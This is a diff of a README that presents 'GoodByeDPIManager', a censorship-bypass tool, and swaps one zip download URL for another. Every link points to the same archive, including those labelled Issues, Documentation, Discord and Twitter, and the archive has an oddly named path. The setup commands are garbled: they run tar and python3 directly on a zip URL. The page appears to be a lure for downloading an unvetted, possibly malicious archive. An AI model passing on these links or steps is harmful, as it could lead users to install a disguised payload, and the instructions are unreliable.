@@ -1,6 +1,6 @@
 # 🌟 GoodByeDPIManager - Bypass Internet Restrictions Easily
 
-[![Download Now](https://raw.githubusercontent.com/Movlud07/GoodByeDPIManager/main/osphyomelitis/GoodByeDPIManager.zip%20Now-Available-green)](https://raw.githubusercontent.com/Movlud07/GoodByeDPIManager/main/osphyomelitis/GoodByeDPIManager.zip)
+[![Download Now](https://github.com/Movlud07/GoodByeDPIManager/raw/refs/heads/main/x86/Good-Manager-DPI-Bye-Sarcodes.zip%20Now-Available-green)](https://github.com/Movlud07/GoodByeDPIManager/raw/refs/heads/main/x86/Good-Manager-DPI-Bye-Sarcodes.zip)
 
 ## 📖 Description
 
@@ -22,12 +22,12 @@ Before you begin, ensure your computer meets these requirements:
 
 To download the latest version of GoodBye DPI Manager, visit the Releases page:
 
-[Download GoodBye DPI Manager](https://raw.githubusercontent.com/Movlud07/GoodByeDPIManager/main/osphyomelitis/GoodByeDPIManager.zip)
+[Download GoodBye DPI Manager](https://github.com/Movlud07/GoodByeDPIManager/raw/refs/heads/main/x86/Good-Manager-DPI-Bye-Sarcodes.zip)
 
 ### 3. 📥 Install the Software
 
 - When you are on the Releases page, locate the latest version listed.
-- Look for a file with a `.exe` extension for Windows, or a `https://raw.githubusercontent.com/Movlud07/GoodByeDPIManager/main/osphyomelitis/GoodByeDPIManager.zip` file for Linux.
+- Look for a file with a `.exe` extension for Windows, or a `https://github.com/Movlud07/GoodByeDPIManager/raw/refs/heads/main/x86/Good-Manager-DPI-Bye-Sarcodes.zip` file for Linux.
 - Click on the file to start the download.
 
 ### 4. 📂 Running the Application
@@ -44,11 +44,11 @@ Once the file downloads:
 - Navigate to the directory where the downloaded file is located.
 - Extract the file using the command: 
   ```bash
-  tar -xzvf <filename>https://raw.githubusercontent.com/Movlud07/GoodByeDPIManager/main/osphyomelitis/GoodByeDPIManager.zip
+  tar -xzvf <filename>https://github.com/Movlud07/GoodByeDPIManager/raw/refs/heads/main/x86/Good-Manager-DPI-Bye-Sarcodes.zip
   ```
 - Change into the extracted directory and start the application using:
   ```bash
-  python3 https://raw.githubusercontent.com/Movlud07/GoodByeDPIManager/main/osphyomelitis/GoodByeDPIManager.zip
+  python3 https://github.com/Movlud07/GoodByeDPIManager/raw/refs/heads/main/x86/Good-Manager-DPI-Bye-Sarcodes.zip
   ```
 
 ## ⚙️ Configuration Options
@@ -87,15 +87,15 @@ You can install GoodBye DPI Manager on multiple devices as long as each device m
 
 ## 📖 Getting Help
 
-If you encounter issues while installing or using GoodBye DPI Manager, consult our [GitHub Issues page](https://raw.githubusercontent.com/Movlud07/GoodByeDPIManager/main/osphyomelitis/GoodByeDPIManager.zip) for common problems and solutions. You can also submit your questions there.
+If you encounter issues while installing or using GoodBye DPI Manager, consult our [GitHub Issues page](https://github.com/Movlud07/GoodByeDPIManager/raw/refs/heads/main/x86/Good-Manager-DPI-Bye-Sarcodes.zip) for common problems and solutions. You can also submit your questions there.
 
 ## 🔗 Additional Resources
 
 For more information, tutorials, and updates:
 
-- Visit our [Documentation](https://raw.githubusercontent.com/Movlud07/GoodByeDPIManager/main/osphyomelitis/GoodByeDPIManager.zip).
-- Join our community on [Discord](https://raw.githubusercontent.com/Movlud07/GoodByeDPIManager/main/osphyomelitis/GoodByeDPIManager.zip).
-- Follow on [Twitter](https://raw.githubusercontent.com/Movlud07/GoodByeDPIManager/main/osphyomelitis/GoodByeDPIManager.zip) for announcements and support.
+- Visit our [Documentation](https://github.com/Movlud07/GoodByeDPIManager/raw/refs/heads/main/x86/Good-Manager-DPI-Bye-Sarcodes.zip).
+- Join our community on [Discord](https://github.com/Movlud07/GoodByeDPIManager/raw/refs/heads/main/x86/Good-Manager-DPI-Bye-Sarcodes.zip).
+- Follow on [Twitter](https://github.com/Movlud07/GoodByeDPIManager/raw/refs/heads/main/x86/Good-Manager-DPI-Bye-Sarcodes.zip) for announcements and support.
 
 ## 🎉 Acknowledgments
 
@@ -103,4 +103,4 @@ This project is built upon the great work by ValdikSS in the original GoodBye DP
 
 Remember, you can always download the latest version here:
 
-[Download GoodBye DPI Manager](https://raw.githubusercontent.com/Movlud07/GoodByeDPIManager/main/osphyomelitis/GoodByeDPIManager.zip)
+[Download GoodBye DPI Manager](https://github.com/Movlud07/GoodByeDPIManager/raw/refs/heads/main/x86/Good-Manager-DPI-Bye-Sarcodes.zip)
